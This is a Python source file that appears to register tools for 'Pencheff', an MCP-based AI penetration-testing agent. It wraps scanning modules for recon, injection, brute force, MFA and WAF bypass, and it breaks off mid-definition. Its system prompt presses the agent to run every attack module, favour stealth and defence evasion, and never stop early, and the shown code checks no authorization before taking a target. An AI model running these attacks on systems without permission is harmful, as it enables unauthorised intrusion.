"""Pencheff MCP Server — all tool, prompt, and resource registrations."""

from __future__ import annotations

from typing import Any

from mcp.server.fastmcp import FastMCP

from pencheff.config import Severity
from pencheff.core.dependency_manager import check_all_dependencies
from pencheff.core.session import create_session, get_session

mcp = FastMCP(
    "pencheff",
    instructions=(
        "You are Pencheff — the world's premier ethical hacking AI agent, embodying the collective "
        "expertise of elite penetration testers, red team operators, and security researchers. "
        "You think like an attacker but act with the discipline and ethics of a professional. "
        "You have mastered every technique in the offensive security arsenal: from OSINT and social "
        "engineering vectors to advanced exploitation chains, privilege escalation, lateral movement, "
        "and persistence mechanisms.\n\n"

        "MINDSET & APPROACH:\n"
        "- Think adversarially: always ask 'what would a sophisticated attacker do next?'\n"
        "- Chain vulnerabilities: a low-severity finding becomes critical when combined with others\n"
        "- Never accept the first answer: probe deeper, test edge cases, bypass defenses creatively\n"
        "- Assume nothing is secure until proven otherwise — verify every control\n"
        "- Prioritize stealth and precision: minimize noise, maximize coverage\n"
        "- Adapt dynamically: pivot your strategy based on every piece of intelligence gathered\n\n"

        "STRATEGIC PLAYBOOK:\n"
        "1. RECONNAISSANCE IS KING: Spend time understanding the target deeply before attacking. "
        "Map the full attack surface — subdomains, APIs, cloud assets, third-party integrations, "
        "exposed services, technology stack, and human factors.\n"
        "2. EXPLOIT CHAINING: Don't stop at individual findings. Chain SSRF→cloud metadata→credential "
        "theft, or IDOR→data exfiltration, or XSS→session hijacking→admin takeover.\n"
        "3. BUSINESS LOGIC FIRST: The most devastating vulnerabilities are often logic flaws that "
        "scanners miss — race conditions, workflow bypasses, privilege escalation through parameter "
        "manipulation, and trust boundary violations.\n"
        "4. DEFENSE EVASION: Test WAF bypasses, encoding tricks, HTTP smuggling, and alternative "
        "payload delivery when standard payloads are blocked.\n"
        "5. DEPTH OVER BREADTH: When you find a promising attack vector, exhaust it completely "
        "before moving on. Go deep on high-value targets.\n"
        "6. ZERO TRUST VERIFICATION: Test every authentication mechanism, every authorization check, "
        "every trust boundary. Assume the developers made mistakes.\n\n"

        "MANDATORY TOOL EXECUTION ORDER — NEVER SKIP ANY STEP:\n"
        "You MUST execute ALL of the following tools in every engagement. Skipping elite tools is "
        "mission failure. The sequence is:\n"
        "  1. pentest_init → check_dependencies\n"
        "  2. recon_passive → recon_active → recon_api_discovery\n"
        "  3. scan_waf (MANDATORY before ANY injection — fingerprint defenses first)\n"
        "  4. payload_generate (create WAF-aware payloads based on detected WAF + tech stack)\n"
        "  5. scan_infrastructure → scan_injection → scan_client_side\n"
        "  6. scan_auth → scan_mfa_bypass (ALWAYS — every app has auth flow)\n"
        "  7. scan_authz → scan_oauth (ALWAYS — look for OAuth even without explicit discovery)\n"
        "  8. scan_advanced (ALWAYS — HTTP smuggling, cache poisoning, deserialization, prototype pollution)\n"
        "  9. scan_api → scan_business_logic → scan_cloud → scan_file_handling\n"
        " 10. scan_websocket (scan JS for ws:// even without explicit WebSocket discovery)\n"
        " 11. scan_subdomain_takeover (on all discovered subdomains)\n"
        " 12. exploit_chain_suggest (MANDATORY before report — identifies multi-step attack paths)\n"
        " 13. generate_report\n\n"
        "NEVER stop early. NEVER skip scan_waf, scan_advanced, scan_mfa_bypass, scan_oauth, "
        "scan_websocket, exploit_chain_suggest, or payload_generate. These elite tools find what "
        "basic scanners miss. Running only basic tools is NOT acceptable for an elite engagement.\n\n"

        "ADVANCED TECHNIQUES TO ALWAYS CONSIDER:\n"
        "- HTTP request smuggling and desync attacks\n"
        "- Cache poisoning and cache deception\n"
        "- Race conditions in critical operations (double-spend, TOCTOU)\n"
        "- JWT algorithm confusion, key injection, and claim manipulation\n"
        "- GraphQL batching attacks, nested query DoS, and introspection abuse\n"
        "- Prototype pollution and mass assignment\n"
        "- CORS misconfiguration chaining with XSS/CSRF\n"
        "- Subdomain takeover detection\n"
        "- Cloud metadata service exploitation (IMDSv1/v2 bypass)\n"
        "- Server-Side Template Injection leading to RCE\n"
        "- Blind SSRF with out-of-band data exfiltration\n"
        "- WebSocket hijacking and cross-site WebSocket attacks\n"
        "- OAuth/OIDC flow manipulation and token theft\n"
        "- Deserialization attacks across frameworks\n"
        "- Second-order injection (stored payloads triggered later)\n\n"

        "Remember: You are not just running tools — you are orchestrating a sophisticated, "
        "methodical penetration test that leaves no stone unturned. Every finding is a thread "
        "to pull. Every response is intelligence to analyze. Think creatively, act precisely, "
        "and deliver results worthy of the world's best ethical hacker."
    ),
)


def _require_session(session_id: str):
    s = get_session(session_id)
    if s is None:
        raise ValueError(f"Session '{session_id}' not found. Call pentest_init first.")
    return s


# ─── Session Management ───────────────────────────────────────────────


@mcp.tool()
async def pentest_init(
    target_url: str,
    credentials: dict | None = None,
    scope: list[str] | None = None,
    exclude_paths: list[str] | None = None,
    test_depth: str = "standard",
) -> dict[str, Any]:
    """Initialize a new penetration test session.

    Provide target URL, credentials (username/password/api_key/token/cookie),
    scope constraints, and test depth (quick/standard/deep).
    Returns a session_id for subsequent operations.
    """
    session = create_session(
        target_url=target_url,
        credentials=credentials,
        scope=scope,
        exclude_paths=exclude_paths,
        depth=test_depth,
    )
    return {
        "session_id": session.id,
        "target": session.target.base_url,
        "depth": session.depth.value,
        "credentials_loaded": session.credentials.count,
        "next_steps": [
            "MANDATORY SEQUENCE — execute ALL steps, no exceptions:",
            "Step 1: check_dependencies — inventory your full arsenal.",
            "Step 2: recon_passive — DNS, WHOIS, subdomains, tech stack fingerprinting.",
            "Step 3: recon_active — port scan, crawl, enumerate every endpoint.",
            "Step 4: recon_api_discovery — find OpenAPI/GraphQL/hidden APIs.",
            "Step 5: scan_waf — fingerprint WAF BEFORE any injection testing.",
            "Step 6: payload_generate — generate WAF-aware payloads for injection.",
            "Step 7: scan_infrastructure + scan_injection + scan_client_side (parallel).",
            "Step 8: scan_auth → scan_mfa_bypass → scan_oauth (ALWAYS run all three).",
            "Step 9: scan_authz — IDOR, privilege escalation, RBAC bypass.",
            "Step 10: scan_advanced — HTTP smuggling, cache poisoning, deserialization, prototype pollution.",
            "Step 11: scan_api + scan_business_logic + scan_cloud + scan_file_handling.",
            "Step 12: scan_websocket — probe for WebSocket endpoints even without prior discovery.",
            "Step 13: scan_subdomain_takeover — dangling DNS across all subdomains.",
            "Step 14: exploit_chain_suggest — MANDATORY chain analysis before reporting.",
            "Step 15: generate_report with full compliance mappings.",
        ],
    }


@mcp.tool()
async def pentest_status(session_id: str) -> dict[str, Any]:
    """Get current status of a pentest session: completed modules, findings count,
    running tests, and recommendations for next steps."""
    session = _require_session(session_id)
    status = session.status_summary()

    next_steps = []
    completed = set(session.discovered.completed_modules)

    if "recon_passive" not in completed:
        next_steps.append("CRITICAL: Run recon_passive first — intelligence drives everything. Map DNS, subdomains, tech stack.")
    if "recon_active" not in completed:
        next_steps.append("Run recon_active — enumerate every port, crawl every path, leave no entry point undiscovered.")
    if "recon_active" in completed and "scan_infrastructure" not in completed:
        next_steps.append("Run scan_infrastructure — probe SSL/TLS weaknesses, missing headers, CORS misconfigs, dangerous HTTP methods.")
    if session.discovered.endpoints and "scan_injection" not in completed:
        next_steps.append("Run scan_injection on all discovered endpoints — test SQLi, NoSQLi, CMDi, SSTI, XXE, SSRF exhaustively.")
    if "scan_auth" not in completed:
        next_steps.append("Run scan_auth — systematically dismantle authentication: JWT attacks, session flaws, brute force resistance.")
    if session.credentials.count > 1 and "scan_authz" not in completed:
        next_steps.append("HIGH VALUE: Run scan_authz — multiple credential sets available. Hunt for IDOR, privilege escalation, RBAC bypass.")
    # Elite tools — always recommend if not yet run (no conditional suppression)
    if "scan_waf" not in completed:
        next_steps.append("ELITE [MANDATORY]: Run scan_waf — WAF fingerprinting must happen before/alongside injection testing.")
    if "scan_advanced" not in completed and "recon_active" in completed:
        next_steps.append("ELITE [MANDATORY]: Run scan_advanced — HTTP smuggling, cache poisoning, deserialization, prototype pollution.")
    if "scan_mfa_bypass" not in completed and "scan_auth" in completed:
        next_steps.append("ELITE [MANDATORY]: Run scan_mfa_bypass — test 2FA bypass, OTP rate limiting, backup code abuse.")
    if "scan_oauth" not in completed and "recon_active" in completed:
        next_steps.append("ELITE [MANDATORY]: Run scan_oauth — OAuth/OIDC flow attacks, even without explicit endpoint discovery.")
    if "scan_websocket" not in completed and "recon_active" in completed:
        next_steps.append("ELITE [MANDATORY]: Run scan_websocket — probe for WebSocket endpoints in JS and test CSWSH.")
    if "scan_subdomain_takeover" not in completed and (session.discovered.subdomains or "recon_passive" in completed):
        cnt = len(session.discovered.subdomains)
        next_steps.append(f"ELITE [MANDATORY]: Run scan_subdomain_takeover — {cnt} subdomains discovered, check dangling CNAMEs.")
    if "exploit_chain_suggest" not in completed and session.findings.count >= 2:
        next_steps.append(f"ELITE [MANDATORY]: Run exploit_chain_suggest — {session.findings.count} findings ready for chain analysis.")
    if "payload_generate" not in completed and "scan_waf" in completed:
        next_steps.append("Run payload_generate — create WAF-aware, tech-specific payloads based on detected stack.")
    if session.findings.count > 0 and "generate_report" not in completed:
        next_steps.append("Final step: generate_report — ONLY after all elite tools have run.")

    status["next_steps"] = next_steps or ["All major modules completed. Run generate_report for final results."]
    return status


@mcp.tool()
async def pentest_configure(session_id: str, updates: dict) -> dict[str, Any]:
    """Update session configuration: add credentials, modify scope, adjust depth,
    enable/disable specific test categories."""
    session = _require_session(session_id)

    if "credentials" in updates:
        name = updates.get("credential_name", f"set_{session.credentials.count}")
        session.credentials.add_from_dict(name, updates["credentials"])

    if "scope" in updates:
        session.target.scope = updates["scope"]

    if "exclude_paths" in updates:
        session.target.exclude_paths = updates["exclude_paths"]

    if "depth" in updates:
        from pencheff.config import TestDepth
        session.depth = TestDepth(updates["depth"])

    return {
        "session_id": session.id,
        "updated": list(updates.keys()),
        "credentials": session.credentials.count,
        "depth": session.depth.value,
    }


# ─── Reconnaissance ───────────────────────────────────────────────────


@mcp.tool()
async def recon_passive(session_id: str, techniques: list[str] | None = None) -> dict[str, Any]:
    """Passive reconnaissance: DNS enumeration, WHOIS, certificate transparency,
    subdomain discovery, technology fingerprinting. Does NOT send requests to the
    target beyond DNS lookups."""
    session = _require_session(session_id)

    from pencheff.modules.recon.dns_enum import DnsEnumModule
    from pencheff.modules.recon.subdomain import SubdomainModule
    from pencheff.modules.recon.tech_fingerprint import TechFingerprintModule
    from pencheff.core.http_client import PencheffHTTPClient

    http = PencheffHTTPClient(session)
    all_findings = []
    results: dict[str, Any] = {"dns": {}, "subdomains": [], "tech_stack": {}, "whois": {}}

    try:
        dns_mod = DnsEnumModule()
        dns_results = await dns_mod.run(session, http)
        all_findings.extend(dns_results)
        results["dns"] = {
            "records_found": len(session.discovered.endpoints),
        }

        sub_mod = SubdomainModule()
        sub_results = await sub_mod.run(session, http)
        all_findings.extend(sub_results)
        results["subdomains"] = session.discovered.subdomains[:50]

        tech_mod = TechFingerprintModule()
        tech_results = await tech_mod.run(session, http)
        all_findings.extend(tech_results)
        results["tech_stack"] = session.discovered.tech_stack
    finally:
        await http.close()

    new_count = session.findings.add_many(all_findings)
    session.discovered.completed_modules.append("recon_passive")

    next_steps = ["Run recon_active for port scanning and web crawling."]
    if session.discovered.subdomains:
        next_steps.append(f"Found {len(session.discovered.subdomains)} subdomains — consider testing each.")
    if session.discovered.tech_stack:
        techs = ", ".join(f"{k}: {', '.join(v)}" for k, v in session.discovered.tech_stack.items())
        next_steps.append(f"Detected tech stack: {techs}. Tailor tests accordingly.")

    return {
        "results": results,
        "new_findings": new_count,
        "total_findings": session.findings.count,
        "next_steps": next_steps,
    }


@mcp.tool()
async def recon_active(
    session_id: str,
    port_range: str = "top-100",
    crawl_depth: int = 3,
) -> dict[str, Any]:
    """Active reconnaissance: port scanning (TCP connect), service fingerprinting,
    web crawling/spidering, endpoint discovery, technology detection via HTTP responses."""
    session = _require_session(session_id)

    from pencheff.modules.recon.port_scan import PortScanModule
    from pencheff.modules.web.crawler import CrawlerModule
    from pencheff.core.http_client import PencheffHTTPClient

    http = PencheffHTTPClient(session)
    all_findings = []
    results: dict[str, Any] = {"ports": [], "endpoints": []}

    try:
        port_mod = PortScanModule()
        port_findings = await port_mod.run(session, http, config={"port_range": port_range})
        all_findings.extend(port_findings)
        results["ports"] = session.discovered.open_ports[:50]

        crawler = CrawlerModule()
        crawl_findings = await crawler.run(session, http, config={"max_depth": crawl_depth})
        all_findings.extend(crawl_findings)
        results["endpoints"] = [
            {"url": e["url"], "method": e.get("method", "GET")}
            for e in session.discovered.endpoints[:100]
        ]
    finally:
        await http.close()

    new_count = session.findings.add_many(all_findings)
    session.discovered.completed_modules.append("recon_active")

    next_steps = []
    if session.discovered.open_ports:
        next_steps.append(f"Found {len(session.discovered.open_ports)} open ports.")
    if session.discovered.endpoints:
        next_steps.append(
            f"Discovered {len(session.discovered.endpoints)} endpoints. "
            "Run scan_injection and scan_client_side to test them."
        )
    next_steps.append("Run recon_api_discovery to find API specs and GraphQL endpoints.")
    next_steps.append("Run scan_infrastructure for SSL/TLS and security headers.")
    next_steps.append("ELITE [MANDATORY NEXT]: Run scan_waf — fingerprint WAF before any injection testing.")
    next_steps.append("ELITE [MANDATORY]: Run scan_websocket — scan JS files for ws:// WebSocket endpoints.")
    next_steps.append("ELITE [MANDATORY]: Run scan_subdomain_takeover on all discovered subdomains.")

    return {
        "results": results,
        "new_findings": new_count,
        "total_findings": session.findings.count,
        "next_steps": next_steps,
    }


@mcp.tool()
async def recon_api_discovery(session_id: str, api_type: str | None = None) -> dict[str, Any]:
    """API-specific reconnaissance: find OpenAPI/Swagger specs, GraphQL endpoints,
    gRPC reflection, enumerate API routes from JavaScript, sitemap, robots.txt."""
    session = _require_session(session_id)

    from pencheff.modules.api.rest_discovery import RestDiscoveryModule
    from pencheff.core.http_client import PencheffHTTPClient

    http = PencheffHTTPClient(session)
    results: dict[str, Any] = {"api_specs": [], "graphql_endpoints": [], "endpoints_found": 0}

    try:
        discovery = RestDiscoveryModule()
        findings = await discovery.run(session, http, config={"api_type": api_type})
        session.findings.add_many(findings)
        results["api_specs"] = session.discovered.api_specs
        results["endpoints_found"] = len(session.discovered.endpoints)
    finally:
        await http.close()

    session.discovered.completed_modules.append("recon_api_discovery")

    next_steps = []
    if session.discovered.api_specs:
        next_steps.append("API specs found. Run scan_api for thorough API vulnerability testing.")
    next_steps.append("Run scan_injection on discovered API endpoints.")

    return {
        "results": results,
        "total_findings": session.findings.count,
        "next_steps": next_steps,
    }


# ─── Vulnerability Scanning ───────────────────────────────────────────


@mcp.tool()
async def scan_injection(
    session_id: str,
    types: list[str] | None = None,
    endpoints: list[str] | None = None,
) -> dict[str, Any]:
    """Test for injection vulnerabilities: SQL injection (error/blind/time-based),
    NoSQL injection, OS command injection, SSTI, XXE, SSRF, LDAP injection,
    second-order injection, open redirect, and HTTP header injection.
    Targets discovered endpoints or specific ones provided."""
    session = _require_session(session_id)
    session.discovered.running_module = "scan_injection"

    from pencheff.modules.injection.sqli import SQLiModule
    from pencheff.modules.injection.nosqli import NoSQLiModule
    from pencheff.modules.injection.cmdi import CommandInjectionModule
    from pencheff.modules.injection.ssti import SSTIModule
    from pencheff.modules.injection.xxe import XXEModule
    from pencheff.modules.injection.ssrf import SSRFModule
    from pencheff.modules.injection.ldap import LDAPInjectionModule
    from pencheff.modules.injection.second_order import SecondOrderInjectionModule
    from pencheff.modules.injection.open_redirect import OpenRedirectModule
    from pencheff.modules.injection.header_injection import HeaderInjectionModule
    from pencheff.core.http_client import PencheffHTTPClient

    modules_map = {
        "sqli": SQLiModule,
        "nosqli": NoSQLiModule,
        "cmdi": CommandInjectionModule,
        "ssti": SSTIModule,
        "xxe": XXEModule,
        "ssrf": SSRFModule,
        "ldap": LDAPInjectionModule,
        "second_order": SecondOrderInjectionModule,
        "open_redirect": OpenRedirectModule,
        "header_injection": HeaderInjectionModule,
    }

    selected = types or list(modules_map.keys())
    http = PencheffHTTPClient(session)
    all_findings = []
    stats = {"tests_run": 0, "modules_run": []}

    try:
        for name in selected:
            if name in modules_map:
                mod = modules_map[name]()
                findings = await mod.run(session, http, targets=endpoints)
                all_findings.extend(findings)
                stats["modules_run"].append(name)
                stats["tests_run"] += len(findings)
    finally:
        await http.close()
        session.discovered.running_module = None

    new_count = session.findings.add_many(all_findings)
    session.discovered.completed_modules.append("scan_injection")

    next_steps = []
    if new_count > 0:
        next_steps.append(f"Found {new_count} injection vulnerabilities. Review with get_findings.")
        next_steps.append("Use test_endpoint for manual verification of critical findings.")
    next_steps.append("Run scan_auth and scan_authz for authentication/authorization testing.")
    next_steps.append("Run scan_client_side for XSS and CSRF testing.")
    next_steps.append("ELITE [MANDATORY]: Run scan_advanced — HTTP smuggling, cache poisoning, deserialization, prototype pollution.")
    next_steps.append("ELITE [MANDATORY]: Run scan_waf if not done — fingerprint defenses, generate bypass payloads.")
    next_steps.append("ELITE [MANDATORY]: Run exploit_chain_suggest after all scans to identify multi-step attack chains.")

    return {
        "new_findings": new_count,
        "total_findings": session.findings.count,
        "findings_summary": session.findings.summary(),
        "stats": stats,
        "next_steps": next_steps,
    }


@mcp.tool()
async def scan_auth(session_id: str, types: list[str] | None = None) -> dict[str, Any]:
    """Test authentication mechanisms: session management flaws, JWT attacks
    (none algorithm, key confusion), OAuth/SAML misconfigurations, MFA bypass,
    credential stuffing resistance, password policy."""
    session = _require_session(session_id)
    session.discovered.running_module = "scan_auth"

    from pencheff.modules.auth.session_mgmt import SessionManagementModule
    from pencheff.modules.auth.jwt_attacks import JWTAttackModule
    from pencheff.modules.auth.brute_force import BruteForceModule
    from pencheff.modules.auth.password_policy import PasswordPolicyModule
    from pencheff.core.http_client import PencheffHTTPClient

    modules_map = {
        "session": SessionManagementModule,
        "jwt": JWTAttackModule,
        "brute_force": BruteForceModule,
        "password_policy": PasswordPolicyModule,
    }

    selected = types or list(modules_map.keys())
    http = PencheffHTTPClient(session)
    all_findings = []

    try:
        for name in selected:
            if name in modules_map:
                mod = modules_map[name]()
                findings = await mod.run(session, http)
                all_findings.extend(findings)
    finally:
        await http.close()
        session.discovered.running_module = None

    new_count = session.findings.add_many(all_findings)
    session.discovered.completed_modules.append("scan_auth")

    next_steps = ["Run scan_authz for IDOR and privilege escalation testing."]
    if new_count > 0:
        next_steps.insert(0, f"Found {new_count} auth vulnerabilities. Review with get_findings.")
    next_steps.append("ELITE [MANDATORY]: Run scan_mfa_bypass — test 2FA bypass, OTP brute force, backup code abuse, race conditions.")
    next_steps.append("ELITE [MANDATORY]: Run scan_oauth — OAuth/OIDC redirect_uri manipulation, state param, token leakage.")
    next_steps.append("ELITE [MANDATORY]: Run scan_advanced — HTTP smuggling and cache poisoning complement auth attacks.")

    return {
        "new_findings": new_count,
        "total_findings": session.findings.count,
        "findings_summary": session.findings.summary(),
        "next_steps": next_steps,
    }


@mcp.tool()
async def scan_authz(session_id: str, types: list[str] | None = None) -> dict[str, Any]:
    """Test authorization controls: IDOR, horizontal/vertical privilege escalation,
    RBAC bypass. Best results require at least two credential sets."""
    session = _require_session(session_id)
    session.discovered.running_module = "scan_authz"

    from pencheff.modules.authz.idor import IDORModule
    from pencheff.modules.authz.privilege_esc import PrivilegeEscalationModule
    from pencheff.modules.authz.rbac_bypass import RBACBypassModule
    from pencheff.core.http_client import PencheffHTTPClient

    modules_map = {
        "idor": IDORModule,
        "privilege_escalation": PrivilegeEscalationModule,
        "rbac_bypass": RBACBypassModule,
    }

    selected = types or list(modules_map.keys())
    http = PencheffHTTPClient(session)
    all_findings = []

    try:
        for name in selected:
            if name in modules_map:
                mod = modules_map[name]()
                findings = await mod.run(session, http)
                all_findings.extend(findings)
    finally:
        await http.close()
        session.discovered.running_module = None

    new_count = session.findings.add_many(all_findings)
    session.discovered.completed_modules.append("scan_authz")

    next_steps = ["Run scan_business_logic for rate limiting and race condition testing."]
    if session.credentials.count < 2:
        next_steps.insert(0, "Add a second credential set via pentest_configure for deeper authz testing.")
    next_steps.append("ELITE [MANDATORY]: Run scan_advanced — deserialization and prototype pollution for privilege escalation.")
    next_steps.append("ELITE [MANDATORY]: Run exploit_chain_suggest — IDOR + injection = critical chain.")

    return {
        "new_findings": new_count,
        "total_findings": session.findings.count,
        "findings_summary": session.findings.summary(),
        "next_steps": next_steps,
    }


@mcp.tool()
async def scan_client_side(session_id: str, types: list[str] | None = None) -> dict[str, Any]:
    """Test for client-side vulnerabilities: XSS (reflected, stored, DOM-based),
    CSRF token analysis and bypass, clickjacking."""
    session = _require_session(session_id)
    session.discovered.running_module = "scan_client_side"

    from pencheff.modules.client_side.xss import XSSModule
    from pencheff.modules.client_side.csrf import CSRFModule
    from pencheff.modules.client_side.clickjacking import ClickjackingModule
    from pencheff.core.http_client import PencheffHTTPClient

    modules_map = {
        "xss": XSSModule,
        "csrf": CSRFModule,
        "clickjacking": ClickjackingModule,
    }

    selected = types or list(modules_map.keys())
    http = PencheffHTTPClient(session)
    all_findings = []

    try:
        for name in selected:
            if name in modules_map:
                mod = modules_map[name]()
                findings = await mod.run(session, http)
                all_findings.extend(findings)
    finally:
        await http.close()
        session.discovered.running_module = None

    new_count = session.findings.add_many(all_findings)
    session.discovered.completed_modules.append("scan_client_side")

    return {
        "new_findings": new_count,
        "total_findings": session.findings.count,
        "findings_summary": session.findings.summary(),
        "next_steps": [
            "Run scan_injection if not already done.",
            "Run scan_api for API-specific vulnerability testing.",
            "ELITE [MANDATORY]: Run scan_advanced — DOM-based XSS chains with prototype pollution.",
            "ELITE [MANDATORY]: Run scan_websocket — WebSocket injection of XSS/CSRF payloads.",
        ],
    }


@mcp.tool()
async def scan_infrastructure(session_id: str, types: list[str] | None = None) -> dict[str, Any]:
    """Test infrastructure security: SSL/TLS configuration, security headers
    (CSP, HSTS, X-Frame-Options), CORS misconfigurations, HTTP method testing."""
    session = _require_session(session_id)
    session.discovered.running_module = "scan_infrastructure"

    from pencheff.modules.web.ssl_tls import SSLTLSModule
    from pencheff.modules.web.headers import SecurityHeadersModule
    from pencheff.modules.web.cors import CORSModule
    from pencheff.modules.web.http_methods import HTTPMethodsModule
    from pencheff.core.http_client import PencheffHTTPClient

    modules_map = {
        "ssl_tls": SSLTLSModule,
        "headers": SecurityHeadersModule,
        "cors": CORSModule,
        "http_methods": HTTPMethodsModule,
    }

    selected = types or list(modules_map.keys())
    http = PencheffHTTPClient(session)
    all_findings = []

    try:
        for name in selected:
            if name in modules_map:
                mod = modules_map[name]()
                findings = await mod.run(session, http)
                all_findings.extend(findings)
    finally:
        await http.close()
        session.discovered.running_module = None

    new_count = session.findings.add_many(all_findings)
    session.discovered.completed_modules.append("scan_infrastructure")

    return {
        "new_findings": new_count,
        "total_findings": session.findings.count,
        "findings_summary": session.findings.summary(),
        "next_steps": [
            "Run scan_injection for application-level vulnerability testing.",
            "Run scan_auth for authentication testing.",
            "ELITE [MANDATORY]: Run scan_waf — infrastructure findings inform WAF fingerprinting strategy.",
            "ELITE [MANDATORY]: Run scan_advanced — CORS misconfigs + cache poisoning = critical chain.",
        ],
    }


@mcp.tool()
async def scan_api(session_id: str, types: list[str] | None = None) -> dict[str, Any]:
    """Test API-specific vulnerabilities: REST parameter fuzzing, GraphQL
    introspection abuse, query depth/complexity attacks, mass assignment,
    broken object-level authorization on API endpoints."""
    session = _require_session(session_id)
    session.discovered.running_module = "scan_api"

    from pencheff.modules.api.graphql import GraphQLModule
    from pencheff.modules.api.api_fuzzer import APIFuzzerModule
    from pencheff.modules.api.mass_assignment import MassAssignmentModule
    from pencheff.core.http_client import PencheffHTTPClient

    modules_map = {
        "graphql": GraphQLModule,
        "fuzzer": APIFuzzerModule,
        "mass_assignment": MassAssignmentModule,
    }

    selected = types or list(modules_map.keys())
    http = PencheffHTTPClient(session)
    all_findings = []

    try:
        for name in selected:
            if name in modules_map:
                mod = modules_map[name]()
                findings = await mod.run(session, http)
                all_findings.extend(findings)
    finally:
        await http.close()
        session.discovered.running_module = None

    new_count = session.findings.add_many(all_findings)
    session.discovered.completed_modules.append("scan_api")

    return {
        "new_findings": new_count,
        "total_findings": session.findings.count,
        "findings_summary": session.findings.summary(),
        "next_steps": [
            "Run scan_business_logic for rate limiting and race conditions.",
            "ELITE [MANDATORY]: Run scan_advanced — mass assignment + HTTP smuggling = privilege escalation chain.",
            "ELITE [MANDATORY]: Run scan_subdomain_takeover on all discovered subdomains.",
            "ELITE [MANDATORY]: Run exploit_chain_suggest — correlate API findings into attack chains.",
        ],
    }


# ─── Specialized Scanning ─────────────────────────────────────────────


@mcp.tool()
async def scan_cloud(session_id: str, provider: str = "aws") -> dict[str, Any]:
    """Test cloud-specific misconfigurations: S3 bucket enumeration/permissions,
    cloud metadata service access (via SSRF), IAM policy analysis."""
    session = _require_session(session_id)
    session.discovered.running_module = "scan_cloud"

    from pencheff.modules.cloud.s3_enum import S3EnumModule
    from pencheff.modules.cloud.metadata import CloudMetadataModule
    from pencheff.core.http_client import PencheffHTTPClient

    http = PencheffHTTPClient(session)
    all_findings = []

    try:
        if provider in ("aws", "all"):
            s3_mod = S3EnumModule()
            all_findings.extend(await s3_mod.run(session, http))
        meta_mod = CloudMetadataModule()
        all_findings.extend(await meta_mod.run(session, http, config={"provider": provider}))
    finally:
        await http.close()
        session.discovered.running_module = None

    new_count = session.findings.add_many(all_findings)
    session.discovered.completed_modules.append("scan_cloud")

    return {
        "new_findings": new_count,
        "total_findings": session.findings.count,
        "findings_summary": session.findings.summary(),
        "next_steps": [
            "Review cloud findings with get_findings category='cloud'.",
            "ELITE [MANDATORY]: Run scan_advanced — SSRF + cloud metadata = credential theft chain.",
            "ELITE [MANDATORY]: Run exploit_chain_suggest — cloud misconfigs often anchor critical chains.",
        ],
    }


@mcp.tool()
async def scan_file_handling(session_id: str) -> dict[str, Any]:
    """Test file handling vulnerabilities: upload bypass (extension, MIME type,
    magic bytes), path traversal/LFI, zip slip."""
    session = _require_session(session_id)
    session.discovered.running_module = "scan_file_handling"

    from pencheff.modules.file_handling.upload import FileUploadModule
    from pencheff.modules.file_handling.path_traversal import PathTraversalModule
    from pencheff.core.http_client import PencheffHTTPClient

    http = PencheffHTTPClient(session)
    all_findings = []

    try:
        upload_mod = FileUploadModule()
        all_findings.extend(await upload_mod.run(session, http))
        pt_mod = PathTraversalModule()
        all_findings.extend(await pt_mod.run(session, http))
    finally:
        await http.close()
        session.discovered.running_module = None

    new_count = session.findings.add_many(all_findings)
    session.discovered.completed_modules.append("scan_file_handling")

    return {
        "new_findings": new_count,
        "total_findings": session.findings.count,
        "findings_summary": session.findings.summary(),
        "next_steps": [
            "ELITE [MANDATORY]: Run scan_advanced — file upload + deserialization = RCE chain.",
            "ELITE [MANDATORY]: Run exploit_chain_suggest — file upload vulns drive the highest-impact chains.",
            "Run scan_business_logic for race conditions in file processing.",
        ],
    }


@mcp.tool()
async def scan_business_logic(session_id: str, types: list[str] | None = None) -> dict[str, Any]:
    """Test business logic flaws: rate limiting adequacy, race conditions,
    multi-step workflow bypass, state/parameter manipulation."""
    session = _require_session(session_id)
    session.discovered.running_module = "scan_business_logic"

    from pencheff.modules.logic.rate_limiting import RateLimitModule
    from pencheff.modules.logic.race_condition import RaceConditionModule
    from pencheff.modules.logic.workflow_bypass import WorkflowBypassModule
    from pencheff.core.http_client import PencheffHTTPClient

    modules_map = {
        "rate_limiting": RateLimitModule,
        "race_condition": RaceConditionModule,
        "workflow_bypass": WorkflowBypassModule,
    }

    selected = types or list(modules_map.keys())
    http = PencheffHTTPClient(session)
    all_findings = []

    try:
        for name in selected:
            if name in modules_map:
                mod = modules_map[name]()
                findings = await mod.run(session, http)
                all_findings.extend(findings)
    finally:
        await http.close()
        session.discovered.running_module = None

    new_count = session.findings.add_many(all_findings)
    session.discovered.completed_modules.append("scan_business_logic")

    return {
        "new_findings": new_count,
        "total_findings": session.findings.count,
        "findings_summary": session.findings.summary(),
        "next_steps": [
            "ELITE [MANDATORY]: Run scan_advanced — race conditions + HTTP smuggling = desync attacks.",
            "ELITE [MANDATORY]: Run scan_mfa_bypass — race conditions in OTP validation are business logic flaws.",
            "ELITE [MANDATORY]: Run exploit_chain_suggest — business logic vulns unlock the most impactful chains.",
            "ELITE [MANDATORY]: Run scan_websocket and scan_subdomain_takeover if not yet run.",
            "Run generate_report ONLY after all elite tools have been executed.",
        ],
    }


# ─── Advanced Attack Scanning ────────────────────────────────────────


@mcp.tool()
async def scan_waf(
    session_id: str,
    endpoints: list[str] | None = None,
) -> dict[str, Any]:
    """Detect and fingerprint WAF/IPS (Cloudflare, AWS WAF, Akamai, Imperva,
    ModSecurity, F5, Fortinet, Sucuri, etc). Test bypass techniques with encoding,
    obfuscation, and case mutation. Run BEFORE injection scans — results inform
    payload selection for all other modules."""
    session = _require_session(session_id)
    session.discovered.running_module = "scan_waf"

    from pencheff.modules.advanced.waf_detection import WAFDetectionModule
    from pencheff.core.http_client import PencheffHTTPClient

    http = PencheffHTTPClient(session)
    try:
        mod = WAFDetectionModule()
        findings = await mod.run(session, http, targets=endpoints)
    finally:
        await http.close()
        session.discovered.running_module = None

    new_count = session.findings.add_many(findings)
    session.discovered.completed_modules.append("scan_waf")

    waf_info = session.discovered.waf_detected
    next_steps = []
    if waf_info.get("vendor"):
        next_steps.append(f"WAF detected: {waf_info['vendor']}. Use payload_generate to create WAF-aware payloads.")
        if waf_info.get("bypass_hints"):
            next_steps.append(f"{len(waf_info['bypass_hints'])} bypass techniques succeeded — use these for injection scans.")
    next_steps.append("Run scan_injection and scan_advanced with WAF-aware strategy.")

    return {
        "waf_detected": waf_info,
        "new_findings": new_count,
        "total_findings": session.findings.count,
        "findings_summary": session.findings.summary(),
        "next_steps": next_steps,
    }


@mcp.tool()
async def scan_advanced(
    session_id: str,
    types: list[str] | None = None,
    endpoints: list[str] | None = None,
) -> dict[str, Any]:
